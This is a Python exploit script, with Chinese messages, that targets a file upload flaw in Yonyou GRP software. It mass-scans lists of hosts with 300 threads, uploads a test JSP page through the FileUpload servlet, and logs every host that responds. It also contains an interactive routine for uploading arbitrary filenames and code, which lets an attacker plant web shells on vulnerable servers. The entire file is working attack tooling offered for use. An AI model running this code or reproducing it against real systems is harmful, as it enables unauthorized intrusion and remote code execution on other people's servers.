import sys, re, requests, argparse, time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
RED_BOLD = "\033[1;31m"
RESET = "\033[0m"
def banner():
    banner = """用友GRP文件上传"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="用友GRP文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(300)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tuage:python {sys.argv[0]} -h")
def poc(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0",
        "Content-Length": "51",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Connection": "close"
    }
    data = '<% out.println(""This page has a vulnerability!"");%>'
    payload_url = '/servlet/FileUpload?fileName=test.jsp&actionID=update'
    url = target + payload_url
    try:
        res = requests.get(url=target, verify=False)
        if res.status_code == 200:
            res2 = requests.post(url=url, data=data, headers=headers, timeout=5, verify=False)
            if res2.status_code == 200:
                print(f'[+]该{target}存在文件上传漏洞')
                with open('用友_result.txt', 'a', encoding='utf-8') as fp:
                    fp.write(target + '\n')
                    return True
            else:
                print(f'[-]该{target}不存在文件上传漏洞')
                return False
        # else:
        #     print(f'[0]该{target}连接失败，请手动测试')
    except Exception as e:
        print(f'该url{target}存在问题，请手动测试')
        return False
def exp(target):
    print("*******可以文件上传啦******")
    time.sleep(2)
    while True:
        filename = input('请输入要上传的文件名>')
        code = input('请输入文件的内容：', )
        if filename == 'q' or code == 'q':
            print("正在退出,请等候……")
            break
        url_payload = f'/servlet/FileUpload?fileName={filename}&actionID=update'
        url = target + url_payload
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
        }
        data = f'{code}'
        res = requests.post(url=url, headers=headers, data=data, timeout=5)
        poc_path = f"/R9iPortal/upload/{filename}"
        url3 = target + poc_path
        res2 = requests.get(url=url3)
        if res.status_code == 200 and "This page has a vulnerability!" in res2.text:
            print(f"{RED_BOLD}[+] 上传成功！请访问：{url3} {RESET}")
        else:
            print(f"{RED_BOLD}没有上传成功")
if __name__ == '__main__':
    main()